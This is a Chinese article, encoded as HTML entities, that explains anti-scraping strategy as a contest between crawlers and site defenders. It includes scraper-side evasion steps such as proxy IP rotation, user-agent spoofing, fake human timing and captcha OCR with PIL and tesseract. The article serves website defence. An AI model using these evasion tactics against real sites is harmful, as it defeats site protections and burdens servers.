&#x4F7F;&#x7528;&#x4EFB;&#x4F55;&#x6280;&#x672F;&#x624B;&#x6BB5;&#xFF0C;&#x963B;&#x6B62;&#x522B;&#x4EBA;&#x6279;&#x91CF;&#x83B7;&#x53D6;&#x81EA;&#x5DF1;&#x7F51;&#x7AD9;&#x4FE1;&#x606F;&#x7684;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#x3002;&#x5173;&#x952E;&#x4E5F;&#x5728;&#x4E8E;&#x6279;&#x91CF;&#x3002; &#x8BEF;&#x4F24; &#x2014;&#x2014; &#x5728;&#x53CD;&#x722C;&#x866B;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x9519;&#x8BEF;&#x7684;&#x5C06;&#x666E;&#x901A;&#x7528;&#x6237;&#x8BC6;&#x522B;&#x4E3A;&#x722C;&#x866B;&#x3002;&#x8BEF;&#x4F24;&#x7387;&#x9AD8;&#x7684;&#x53CD;&#x722C;&#x866B;&#x7B56;&#x7565;&#xFF0C;&#x6548;&#x679C;&#x518D;&#x597D;&#x4E5F;&#x4E0D;&#x80FD;&#x7528;&#x3002; &#x62E6;&#x622A; &#x2014;&#x2014; &#x6210;&#x529F;&#x5730;&#x963B;&#x6B62;&#x722C;&#x866B;&#x8BBF;&#x95EE;&#x3002;&#x901A;&#x5E38;&#x6765;&#x8BF4;&#xFF0C;&#x62E6;&#x622A;&#x7387;&#x8D8A;&#x9AD8;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x8BEF;&#x4F24;&#x7387;&#x5C31;&#x8D8A;&#x9AD8;&#xFF0C;&#x56E0;&#x6B64;&#x8981;&#x505A;&#x6743;&#x8861;&#x3002; &#x8D44;&#x6E90; &#x2014;&#x2014; &#x673A;&#x5668;&#x6210;&#x672C;&#x4E0E;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x7684;&#x603B;&#x548C;&#x3002; &#x53CD;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x722C;&#x866B; &#x5E94;&#x5C4A;&#x6BD5;&#x4E1A;&#x751F;(&#x4E09;&#x6708;&#x4EFD;&#x722C;&#x866B;)&#x4E09;&#x6708;&#x4EFD;&#x722C;&#x866B;&#x901A;&#x5E38;&#x548C;&#x6BD5;&#x4E1A;&#x751F;(&#x672C;&#x79D1;&#x751F;&#x3001;&#x7855;&#x58EB;&#x3001;&#x535A;&#x58EB;&#x7B49;)&#x6709;&#x5173;&#xFF0C;&#x4ED6;&#x4EEC;&#x7684;&#x722C;&#x866B;&#x7B80;&#x5355;&#x7C97;&#x66B4;&#xFF0C;&#x4E3A;&#x4E86;&#x8BA9;&#x8BBA;&#x6587;&#x6709;&#x6570;&#x636E;&#x652F;&#x6491;&#xFF0C;&#x6839;&#x672C;&#x4E0D;&#x7BA1;&#x670D;&#x52A1;&#x5668;&#x538B;&#x529B;&#xFF0C;&#x52A0;&#x4E0A;&#x4EBA;&#x6570;&#x4E0D;&#x53EF;&#x9884;&#x6D4B;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x5F04;&#x6302;&#x7AD9;&#x70B9;&#x3002; &#x521B;&#x4E1A;&#x5C0F;&#x516C;&#x53F8;&#x6BCF;&#x5E74;&#x65B0;&#x589E;&#x7684;&#x521B;&#x4E1A;&#x516C;&#x53F8;&#x5F88;&#x591A;&#xFF0C;&#x7A0B;&#x5E8F;&#x5F00;&#x53D1;&#x5B8C;&#x540E;&#xFF0C;&#x7F3A;&#x5C11;&#x6570;&#x636E;&#x652F;&#x6491;&#xFF0C;&#x51FA;&#x4E8E;&#x516C;&#x53F8;&#x751F;&#x6B7B;&#x5B58;&#x4EA1;&#x7684;&#x8003;&#x8651;&#xFF0C;&#x4E0D;&#x65AD;&#x722C;&#x53D6;&#x6570;&#x636E;&#x3002; &#x4E0D;&#x5C0F;&#x5FC3;&#x5199;&#x9519;&#x4E86;&#x6CA1;&#x4EBA;&#x53BB;&#x505C;&#x6B62;&#x7684;&#x5931;&#x63A7;&#x5C0F;&#x722C;&#x866B;&#x50CF;&#x77E5;&#x4E4E;&#xFF0C;&#x643A;&#x7A0B;&#xFF0C;&#x8D22;&#x7ECF;&#x7B49;&#x7F51;&#x7AD9;&#xFF0C;&#x53EF;&#x80FD;&#x9AD8;&#x8FBE;60%&#x7684;&#x8BBF;&#x95EE;&#x91CF;&#x662F;&#x722C;&#x866B;&#x3002;&#x4F60;&#x5C31;&#x7B97;&#x76F4;&#x63A5;&#x5C01;&#x6740;&#xFF0C;&#x4E5F;&#x65E0;&#x6D4E;&#x4E8E;&#x4E8B;&#x3002;&#x4ED6;&#x4EEC;&#x53EF;&#x80FD;&#x6839;&#x672C;&#x722C;&#x4E0D;&#x5230;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x4E86;&#xFF0C;&#x9664;&#x4E86;http code&#x662F;200&#x4EE5;&#x5916;&#xFF0C;&#x4E00;&#x5207;&#x90FD;&#x662F;&#x4E0D;&#x5BF9;&#x7684;&#xFF0C;&#x4F46;&#x7531;&#x4E8E;&#x6258;&#x7BA1;&#x540E;&#x65E0;&#x4EBA;&#x8BA4;&#x9886;&#xFF0C;&#x4ECD;&#x7136;&#x4F1A;&#x4F9D;&#x7136;&#x5B5C;&#x5B5C;&#x4E0D;&#x5026;&#x5730;&#x722C;&#x53D6;&#x3002; &#x6210;&#x578B;&#x7684;&#x5546;&#x4E1A;&#x5BF9;&#x624B;&#x8FD9;&#x662F;&#x6700;&#x5927;&#x7684;&#x5BF9;&#x624B;&#xFF0C;&#x6709;&#x6280;&#x672F;&#xFF0C;&#x6709;&#x94B1;&#xFF0C;&#x8981;&#x4EC0;&#x4E48;&#x6709;&#x4EC0;&#x4E48;&#xFF0C;&#x5982;&#x679C;&#x548C;&#x4F60;&#x6B7B;&#x78D5;&#xFF0C;&#x4F60;&#x5C31;&#x53EA;&#x80FD;&#x786C;&#x7740;&#x5934;&#x76AE;&#x548C;&#x4ED6;&#x6B7B;&#x78D5;&#x3002; &#x62BD;&#x98CE;&#x7684;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x4E5F;&#x6709;&#x62BD;&#x98CE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x800C;&#x4E14;&#x4E00;&#x62BD;&#x98CE;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x4E0B;&#x964D;&#xFF0C;&#x8BF7;&#x6C42;&#x91CF;&#x8DDF;&#x7F51;&#x7EDC;&#x653B;&#x51FB;&#x6CA1;&#x6709;&#x533A;&#x522B;&#x3002; &#x5E38;&#x89C1;&#x7684;&#x722C;&#x866B;&#x3001;&#x53CD;&#x722C;&#x866B;&#x624B;&#x6BB5; &#x722C;&#x866B; &#x53CD;&#x722C;&#x866B; &#x5BF9;&#x67D0;&#x4E2A;&#x7F51;&#x7AD9;&#x6216;&#x8005;APP&#x7684;&#x6570;&#x636E;&#x611F;&#x5174;&#x8DA3;&#x3002; [1] &#x9996;&#x5148;&#x5206;&#x6790;&#x7F51;&#x7AD9;/APP [2]&#x7684;&#x8BF7;&#x6C42;&#x4E0E;&#x8FD4;&#x56DE;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x7528;python&#xFF0C;&#x6216;Java&#xFF0C;&#x6216;&#x7F51;&#x4E0A;&#x514D;&#x8D39;&#x7684;&#x6293;&#x53D6;&#x8F6F;&#x4EF6;&#xFF0C;&#x4E0D;&#x65AD;&#x904D;&#x5386;&#x67D0;&#x5217;&#x8868;&#x6293;&#x53D6;&#x6570;&#x636E;&#x5B58;&#x6570;&#x636E;&#x5E93;&#x3002; zabbix&#x7B49;&#x76D1;&#x63A7;&#x663E;&#x793A;&#x67D0;&#x65F6;&#x95F4;&#x6BB5;&#x8BF7;&#x6C42;&#x9661;&#x589E;&#xFF0C;ip&#x76F8;&#x540C;&#xFF0C;useragent&#x8FD8;&#x662F;JavaClient&#xFF0C;&#x76F4;&#x63A5;Nginx&#x5C01;&#x6740;&#x8FD9;&#x4E2A;ip useragent&#x6A21;&#x4EFF;&#x8C37;&#x6B4C;&#x6216;&#x8005;&#x767E;&#x5EA6;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;&#x518D;&#x83B7;&#x53D6;&#x5341;&#x51E0;&#x4E2A;&#x4EE3;&#x7406;ip&#xFF0C;&#x722C;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x65AD;&#x8F6E;&#x8BE2;&#x66FF;&#x6362;ip &#x53D1;&#x73B0;ip&#x4E0D;&#x65AD;&#x53D8;&#x5316;&#xFF0C;&#x76F4;&#x63A5;&#x6BCF;&#x6B21;&#x8BF7;&#x6C42;&#x6DFB;&#x52A0;&#x7528;&#x6237;&#x662F;&#x5426;&#x767B;&#x5F55;&#x7684;&#x6821;&#x9A8C; &#x901A;&#x8FC7;&#x6CE8;&#x518C;&#x7B49;&#x5404;&#x79CD;&#x65B9;&#x6CD5;&#xFF0C;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x771F;&#x5B9E;&#x8D26;&#x53F7;&#xFF0C;&#x6A21;&#x62DF;&#x767B;&#x5F55;&#xFF0C;&#x6BCF;&#x6B21;&#x8BF7;&#x6C42;&#x643A;&#x5E26;&#x767B;&#x5F55;&#x4EA7;&#x751F;&#x7684;cookie&#x6216;&#x8005;token&#x3002; &#x5065;&#x5168;&#x8D26;&#x53F7;&#x6743;&#x9650;&#x4F53;&#x7CFB;&#xFF0C;&#x5373;&#x62E5;&#x6709;A&#x7684;&#x8D26;&#x53F7;&#xFF0C;&#x65E0;&#x6CD5;&#x83B7;&#x53D6;&#x8D26;&#x53F7;B&#x7684;&#x6570;&#x636E;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x3002; &#x8BBE;&#x7F6E;&#x5B9A;&#x65F6;&#x5668;&#xFF0C;&#x7B80;&#x5355;&#x7C97;&#x66B4;&#x7684;&#x76F4;&#x63A5;&#x722C;&#x53D6;&#x6240;&#x6709;&#x80FD;&#x722C;&#x53D6;&#x7684;&#x6570;&#x636E; &#x9488;&#x5BF9;&#x591A;IP&#x7684;&#x9AD8;&#x9891;&#x8BBF;&#x95EE;&#xFF0C;Nginx&#x8BBE;&#x7F6E;&#x9891;&#x7387;&#x9650;&#x5236;&#xFF0C;&#x5982;&#x67D0;&#x4E2A;ip&#x77ED;&#x65F6;&#x95F4;&#x8BBF;&#x95EE;&#x8D85;&#x8FC7;&#x4E00;&#x5B9A;&#x6B21;&#x6570;&#x5C31;&#x76F4;&#x63A5;&#x5C4F;&#x853D;&#xFF0C;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x589E;&#x52A0;&#x722C;&#x866B;&#x65B9;&#x83B7;&#x53D6;&#x6709;&#x6548;IP&#x7684;&#x6210;&#x672C; &#x5199;&#x4EE3;&#x7801;&#x722C;&#x53D6;ip&#x4EE3;&#x7406;&#x7F51;&#x7AD9;&#xFF0C;&#x6216;&#x8005;&#x6279;&#x91CF;&#x8D2D;&#x4E70;&#x9AD8;&#x533F;&#x4EE3;&#x7406;ip&#xFF0C;&#x51E0;&#x5343;IP&#x8F6E;&#x8BE2;&#x722C; &#x5728;&#x8BBF;&#x95EE;&#x9891;&#x7387;&#x4E0A;&#x7EE7;&#x7EED;&#x505A;&#x6587;&#x7AE0;&#xFF0C;&#x5347;&#x7EA7;ip&#x9650;&#x5236;&#x7B56;&#x7565;&#xFF0C;&#x52A0;&#x5927;ip&#x9650;&#x5236;&#x7684;&#x6210;&#x529F;&#x7387;&#x3002; [3] ip&#x5927;&#x91CF;&#x88AB;&#x5C01;&#xFF0C;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x95EE;&#x9898;&#xFF0C;&#x5F00;&#x59CB;&#x6A21;&#x62DF;&#x4EBA;&#x7C7B;&#x8BF7;&#x6C42;&#x7279;&#x5F81;&#xFF0C;&#x6BD4;&#x5982;&#x6BCF;&#x534A;&#x5C0F;&#x65F6;&#x722C;&#x53D6;&#x6539;&#x4E3A;&#x968F;&#x673A;1-3&#x79D2;&#x722C;&#x4E00;&#x6B21;&#xFF0C;&#x722C;10&#x6B21;&#x4F11;&#x606F;10&#x79D2;&#xFF0C;&#x6BCF;&#x5929;&#x53EA;&#x5728;8-12&#xFF0C;18-0&#x70B9;&#x722C;&#xFF0C;&#x9694;&#x51E0;&#x5929;&#x8FD8;&#x4F11;&#x606F;&#x4E00;&#x4E0B;&#x3002;&#x518D;&#x6BD4;&#x5982;&#x4E3A;&#x4E86;&#x51CF;&#x5C11;&#x8BF7;&#x6C42;&#xFF0C;&#x80FD;&#x53EA;&#x6293;&#x5217;&#x8868;&#x9875;&#x5C31;&#x4E0D;&#x6293;&#x8BE6;&#x60C5;&#x9875; &#x6B64;&#x523B;&#x518D;&#x5728;&#x8BBF;&#x95EE;&#x9891;&#x7387;&#x4E0A;&#x505A;&#x9650;&#x5236;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x8BEF;&#x4F24;&#x771F;&#x5B9E;&#x7528;&#x6237;&#x3002;&#x5982;&#x679C;&#x7F51;&#x7AD9;&#x7C7B;&#x578B;&#x4E0D;&#x592A;&#x6CE8;&#x91CD;&#x7528;&#x6237;&#x4F53;&#x9A8C;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x4E00;&#x5B9A;&#x6B21;&#x6570;&#x5F3A;&#x5236;&#x5F39;&#x6846;&#x8981;&#x6C42;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#x7801;&#x3002; [4] &#x7B80;&#x5355;&#x7684;&#x9A8C;&#x8BC1;&#x7801;&#xFF0C;&#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x81EA;&#x5B66;&#x56FE;&#x50CF;&#x8BC6;&#x522B;&#x7684;&#x6559;&#x7A0B;&#xFF08;&#x5173;&#x952E;&#x8BCD;PIL&#xFF0C;tesseract&#xFF09;&#xFF0C;&#x5BF9;&#x9A8C;&#x8BC1;&#x7801;&#x8FDB;&#x884C;&#x4E8C;&#x503C;&#x5316;&#x9884;&#x5904;&#x7406;&#xFF0C;&#x5206;&#x5272;&#xFF0C;&#x6A21;&#x5F0F;&#x8BAD;&#x7EC3;&#x540E;&#xFF0C;&#x8BC6;&#x522B;&#x9A8C;&#x8BC1;&#x7801;&#x3002;[5] &#x9488;&#x5BF9;&#x5177;&#x6709;&#x7528;&#x6237;&#x884C;&#x4E3A;&#x7684;&#x722C;&#x866B;&#xFF0C;&#x9996;&#x5148;&#x8981;&#x660E;&#x767D;&#xFF0C;&#x722C;&#x866B;&#x4E0E;&#x4EBA;&#x7C7B;&#x5728;&#x8BBF;&#x95EE;&#x7279;&#x5F81;&#x4E0A;&#x6700;&#x5927;&#x7684;&#x4E0D;&#x4E00;&#x6837;&#x5728;&#x4E8E;&#xFF0C;&#x4EBA;&#x4E0D;&#x4F1A;&#x957F;&#x65F6;&#x95F4;&#x6301;&#x7EED;&#x8BBF;&#x95EE;&#x4E00;&#x4E2A;&#x7F51;&#x7AD9;&#xFF0C;&#x800C;&#x722C;&#x866B;&#x7684;&#x8BBF;&#x95EE;&#x6570;&#x91CF;&#x4F1A;&#x968F;&#x7740;&#x65F6;&#x95F4;&#x589E;&#x957F;&#x800C;&#x7EBF;&#x6027;&#x589E;&#x957F;[6]&#x3002;&#x6839;&#x636E;&#x8FD9;&#x7279;&#x5F81;&#xFF0C;&#x5206;&#x6790;&#x8BF7;&#x6C42;&#x65E5;&#x5FD7;&#xFF0C;&#x8BBE;&#x7F6E;ip&#x9ED1;&#x540D;&#x5355;&#x3002; &#x7531;&#x4E8E;&#x5404;&#x79CD;&#x9650;&#x5236;&#xFF0C;&#x5355;&#x4E2A;&#x722C;&#x866B;&#x8F6E;&#x8BE2;ip&#x6A21;&#x62DF;&#x7528;&#x6237;&#x884C;&#x4E3A;&#x8FDB;&#x884C;&#x722C;&#x53D6;&#xFF0C;&#x6548;&#x7387;&#x5DF2;&#x7ECF;&#x5927;&#x5927;&#x964D;&#x4F4E;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6709;&#x6761;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x8DE8;&#x7701;&#x8DE8;&#x673A;&#x623F;&#xFF0C;&#x5229;&#x7528;ADSL&#x8FDB;&#x884C;&#x957F;&#x671F;&#x722C;&#x53D6;&#x3002; &#x65E2;&#x7136;&#x65E0;&#x6CD5;&#x907F;&#x514D;&#x88AB;&#x722C;&#xFF0C;&#x90A3;&#x5C31;&#x7EE7;&#x7EED;&#x52A0;&#x5927;&#x5BF9;&#x65B9;&#x722C;&#x53D6;&#x6210;&#x672C;&#x3002;[7] &#x5982;&#x679C;&#x6B7B;&#x78D5;&#x5230;&#x5E95;&#x3002;&#x3002; &#x53EA;&#x80FD;&#x786C;&#x7740;&#x5934;&#x76AE;&#x548C;&#x4ED6;&#x7EE7;&#x7EED;&#x6B7B;&#x78D5;&#xFF0C;&#x76F4;&#x5230;&#x4E00;&#x65B9;&#x56E0;&#x4E3A;&#x673A;&#x5668;&#x6210;&#x672C;&#x4E0E;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x95EE;&#x9898;&#x653E;&#x5F03;&#x3002; [1] &#x722C;&#x53D6;&#x7684;&#x524D;&#x63D0;&#x662F;&#x77E5;&#x9053;&#x7F51;&#x7AD9;/APP&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x5982;&#x679C;&#x7CFB;&#x7EDF;&#x4E0D;&#x5BF9;&#x5916;&#x5F00;&#x653E;&#xFF0C;&#x4F60;&#x53EF;&#x80FD;&#x8FDE;&#x5B83;&#x7684;&#x5B58;&#x5728;&#x90FD;&#x4E0D;&#x77E5;&#x9053;&#x3002; [2] APP&#x7684;&#x8BF7;&#x6C42;&#x53EF;&#x4EE5;&#x7528;Fiddler&#x6293;&#x53D6;&#xFF0C;&#x5177;&#x4F53;&#x64CD;&#x4F5C;&#x89C1;&#x6587;&#x5C3E;&#x7684;&#x76F8;&#x5173;&#x94FE;&#x63A5;&#x3002;&#x4E00;&#x4E9B;APP&#x7684;&#x722C;&#x53D6;&#x76F8;&#x5BF9;Web&#x96BE;&#x5EA6;&#x8F83;&#x9AD8;&#xFF0C;&#x6587;&#x672C;&#x53EF;&#x80FD;&#x8FDB;&#x884C;&#x4E86;&#x538B;&#x7F29;&#x548C;&#x52A0;&#x5BC6;&#xFF0C;&#x751A;&#x81F3;&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x7528;&#x6237;&#x6D41;&#x91CF;&#xFF0C;&#x90E8;&#x5206;&#x8BF7;&#x6C42;&#x4E0D;&#x8D70;&#x540E;&#x7AEF;&#xFF0C;Fiddler&#x81EA;&#x7136;&#x6293;&#x53D6;&#x4E0D;&#x5230;&#x3002; [3] &#x62E6;&#x622A;&#x7387;&#x8D8A;&#x9AD8;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x8BEF;&#x4F24;&#x7387;&#x5C31;&#x8D8A;&#x9AD8;&#xFF0C;&#x751A;&#x81F3;&#x5F71;&#x54CD;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x7684;&#x6536;&#x5F55;&#x3002;&#x5982;&#x679C;&#x7F51;&#x7AD9;&#x5305;&#x542B;&#x4E0D;&#x5E0C;&#x671B;&#x88AB;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x6536;&#x5F55;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x7AD9;&#x70B9;&#x90E8;&#x7F72; robots &#x6587;&#x4EF6;&#x3002; [4] &#x77E5;&#x4E4E;&#x5C31;&#x4E0D;&#x592A;&#x53EF;&#x80FD;&#x4E3A;&#x4E86;&#x53CD;&#x6252;&#x5F3A;&#x5236;&#x8981;&#x6C42;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#x7801;&#xFF0C;&#x800C;CSDN&#x7684;&#x6587;&#x4EF6;&#x4E00;&#x65E6;&#x4E0B;&#x8F7D;&#x6B21;&#x6570;&#x8FC7;&#x591A;&#xFF0C;&#x5C31;&#x4F1A;&#x5F3A;&#x5236;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#x7801;&#x3002; [5] &#x5173;&#x4E8E;&#x9A8C;&#x8BC1;&#x7801;&#x7684;&#x8BC6;&#x522B;&#x4E0E;&#x53CD;&#x8BC6;&#x522B;&#x4E5F;&#x662F;&#x4E00;&#x90E8;&#x6062;&#x5F18;&#x58EE;&#x4E3D;&#x7684;&#x6597;&#x4E89;&#x53F2;&#xFF0C;&#x76EE;&#x524D;&#x7684;&#x4EBA;&#x673A;&#x8BC6;&#x522B;&#x9A8C;&#x8BC1;&#x5C31;&#x662F;&#x6BD4;&#x8F83;&#x6709;&#x6548;&#x7684;&#x53CD;&#x722C;&#x624B;&#x6BB5;&#x3002;&#x6570;&#x5B57;&#x9A8C;&#x8BC1;&#x7801;&#x8BC6;&#x522B;&#x8BE6;&#x89C1;: &#x722C;&#x866B;&#x7684;&#x574E;&#x5777;&#x4E4B;&#x8DEF;-&#x6570;&#x5B57;&#x9A8C;&#x8BC1;&#x7801;&#x8BC6;&#x522B; [6] &#x5173;&#x4E8E;&#x4EBA;&#x7C7B;&#x8BBF;&#x95EE;&#x7279;&#x5F81;&#x7684;&#x4ECB;&#x7ECD;&#xFF0C;&#x8BE6;&#x89C1;: &#x5F53;&#x722C;&#x866B;&#x4E0D;&#x9075;&#x5B88; robots &#x534F;&#x8BAE;&#x65F6;&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x9632;&#x6B62;&#x6293;&#x53D6;&#x7684;&#x53EF;&#x80FD;&#xFF1F; [7] &#x53CD;&#x722C;&#x866B;&#x7684;&#x5173;&#x952E;&#x5728;&#x4E8E;&#x963B;&#x6B62;&#x88AB;&#x6279;&#x91CF;&#x722C;&#x53D6;&#xFF0C;&#x91CD;&#x70B9;&#x5728;&#x6279;&#x91CF;&#x3002;&#x53CD;&#x722C;&#x866B;&#x6280;&#x672F;&#x7684;&#x6838;&#x5FC3;&#x5728;&#x4E8E;&#x4E0D;&#x65AD;&#x53D8;&#x66F4;&#x89C4;&#x5219;&#xFF0C;&#x6BD4;&#x5982;&#x4E0D;&#x65AD;&#x53D8;&#x66F4;&#x9A8C;&#x8BC1;&#x7801;&#x3002;&#x6211;&#x4EEC;&#x5728;&#x5185;&#x5BB9;&#x4E0A;&#x53EF;&#x4EE5;&#x505A;&#x5982;&#x4E0B;&#x6587;&#x7AE0;&#xFF1A; &#x7F51;&#x7AD9;&#x4E0D;&#x540C;&#x5730;&#x65B9;&#x7684;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x6DFB;&#x52A0;&#x4E0D;&#x540C;&#x7684;&#x81EA;&#x5E26;&#x6807;&#x7B7E;&#xFF0C;&#x589E;&#x52A0;&#x5BF9;&#x65B9;&#x6570;&#x636E;&#x6E05;&#x7406;&#x96BE;&#x5EA6;&#x3002; &#x5173;&#x952E;&#x6570;&#x636E;&#x7531;&#x6587;&#x672C;&#x8F6C;&#x56FE;&#x7247;&#xFF0C;&#x751A;&#x81F3;&#x6DFB;&#x52A0;&#x6C34;&#x5370;&#x7B49;&#x3002;&#x76EE;&#x524D;&#x5E02;&#x573A;&#x4E0A;&#x56FE;&#x7247;ocr&#x8BC6;&#x522B;&#x65E0;&#x6CD5;&#x6709;&#x6548;&#x8F6C;&#x6587;&#x5B57;&#xFF0C;&#x8BA9;&#x5BF9;&#x65B9;&#x5373;&#x4F7F;&#x83B7;&#x53D6;&#x4E86;&#x56FE;&#x7247;&#x4E5F;&#x65E0;&#x6CD5;&#x6709;&#x6548;&#x4F7F;&#x7528;&#x3002; &#x7F51;&#x7AD9;&#x76F8;&#x5173;&#x9875;&#x9762;&#x7684;&#x5217;&#x8868;&#x67E5;&#x8BE2;&#xFF0C;&#x9650;&#x5236;&#x603B;&#x9875;&#x6570;&#x7684;&#x5C55;&#x793A;&#x3002;&#x6BD4;&#x5982;&#x6570;&#x636E;&#x4E00;&#x5171;1K&#x9875;&#xFF0C;&#x76F8;&#x5173;&#x63A5;&#x53E3;&#x5374;&#x53EA;&#x5BF9;&#x5916;&#x5C55;&#x793A;&#x524D;&#x5341;&#x9875;&#x3002;&#x5BF9;&#x65B9;&#x627E;&#x4E0D;&#x5230;&#x5165;&#x53E3;&#x6700;&#x591A;&#x722C;&#x53D6;10&#x9875;&#x6570;&#x636E;&#x3002; &#x95F4;&#x63A5;&#x5173;&#x95ED;&#x7F51;&#x7AD9;&#x6838;&#x5FC3;&#x6570;&#x636E;&#x67E5;&#x770B;&#x5165;&#x53E3;&#xFF0C;&#x6BD4;&#x5982;&#x5185;&#x5BB9;&#x7684;&#x67E5;&#x770B;&#x50CF;&#x767E;&#x5EA6;&#x6587;&#x5E93;&#x4E00;&#x6837;&#x6539;&#x4E3A;word&#x3001;pdf&#x6216;&#x8005;ppt&#x4E0B;&#x8F7D;&#x6A21;&#x5F0F;&#xFF0C;&#x9AD8;&#x9891;&#x4E0B;&#x8F7D;&#x9700;&#x8981;&#x9A8C;&#x8BC1;&#x7801;&#x6216;&#x8005;&#x8D26;&#x53F7;&#x79EF;&#x5206;&#x3002; &#x7F51;&#x7AD9;&#x4E0D;&#x63D0;&#x4F9B;&#x6CE8;&#x518C;&#x5165;&#x53E3;&#xFF0C;&#x6216;&#x8005;&#x6CE8;&#x518C;&#x9700;&#x8981;&#x5185;&#x90E8;&#x63A8;&#x8350;&#x6216;&#x8005;&#x8BC4;&#x5BA1;&#xFF0C;&#x52A0;&#x5927;&#x722C;&#x866B;&#x65B9;&#x83B7;&#x53D6;&#x8D26;&#x53F7;&#x7684;&#x96BE;&#x5EA6;&#x3002; &#x7F51;&#x7AD9;&#x7684;&#x8BF7;&#x6C42;url&#x590D;&#x6742;&#x5316;&#xFF0C;&#x6BD4;&#x5982;&#x5F04;&#x7684;&#x50CF;&#x6DD8;&#x5B9D;&#x4E00;&#x6837;&#x6CA1;&#x6709;&#x89C4;&#x5F8B;&#xFF0C;id&#x6539;&#x4E3A;UUID&#x7B49;&#x3002; &#x524D;&#x7AEF;&#x9875;&#x9762;&#x5C3D;&#x53EF;&#x80FD;&#x4E0D;&#x66B4;&#x9732;&#x6570;&#x636E;&#x7684;&#x552F;&#x4E00;&#x952E;&#xFF0C;&#x5BF9;&#x552F;&#x4E00;&#x952E;&#x5982;&#x4E3B;&#x952E;id&#x7B49;&#x8FDB;&#x884C;&#x4F2A;&#x88C5;&#xFF0C;&#x53EF;&#x4EE5;&#x589E;&#x52A0;&#x5BF9;&#x65B9;&#x722C;&#x53D6;&#x540E;&#x7684;&#x53BB;&#x91CD;&#x6210;&#x672C;&#x3002;&#x56E0;&#x4E3A;&#x5BF9;&#x65B9;&#x722C;&#x6570;&#x636E;&#x53EF;&#x80FD;&#x662F;&#x5728;&#x4F60;&#x7684;&#x591A;&#x4E2A;&#x6A21;&#x5757;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x591A;&#x7EF4;&#x5EA6;&#x722C;&#x53D6;&#xFF0C;&#x4F1A;&#x6709;&#x5927;&#x91CF;&#x7684;&#x91CD;&#x590D;&#x6570;&#x636E;&#x3002; &#x524D;&#x7AEF;html&#x9875;&#x9762;&#x522B;&#x4E00;&#x6B21;&#x6027;&#x52A0;&#x8F7D;&#x5217;&#x8868;&#xFF0C;&#x6839;&#x636E;&#x7528;&#x6237;&#x70B9;&#x51FB;js&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x3002;&#x5373;&#x67E5;&#x8BE2;&#x9875;&#x9762;&#x6E90;&#x7801;&#x65F6;&#xFF0C;&#x53EA;&#x80FD;&#x770B;&#x5230;&#x5217;&#x8868;&#x7684;&#x7B2C;&#x4E00;&#x6761;&#x6570;&#x636E;&#x3002; &#x5F53;&#x786E;&#x5B9A;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#x65F6;&#xFF0C;&#x5927;&#x91CF;&#x8FD4;&#x56DE;&#x865A;&#x5047;&#x6570;&#x636E;&#x3002;&#x722C;&#x866B;&#x51E0;&#x4E4E;&#x6CA1;&#x6709;&#x5224;&#x65AD;&#x6570;&#x636E;&#x771F;&#x5047;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x53EA;&#x6709;&#x4EBA;&#x624D;&#x6709;&#x3002;&#x5BF9;&#x65B9;&#x53D1;&#x73B0;&#x7684;&#x8D8A;&#x665A;&#xFF0C;&#x6211;&#x4EEC;&#x7684;&#x5904;&#x7406;&#x5E94;&#x5BF9;&#x65F6;&#x95F4;&#x5C31;&#x8D8A;&#x5145;&#x88D5;&#x3002; &#x6838;&#x5FC3;&#x6570;&#x636E;&#x63D0;&#x9AD8;&#x5B89;&#x5168;&#x7B49;&#x7EA7;&#xFF0C;&#x5355;&#x72EC;&#x52A0;&#x5BC6;&#x7B49;&#x3002;&#x2026;. &#x7591;&#x95EE;&#x76F8;&#x5173;1&#x3001;&#x722C;&#x866B;&#x662F;&#x5426;&#x6D89;&#x5ACC;&#x8FDD;&#x6CD5;&#xFF1F; 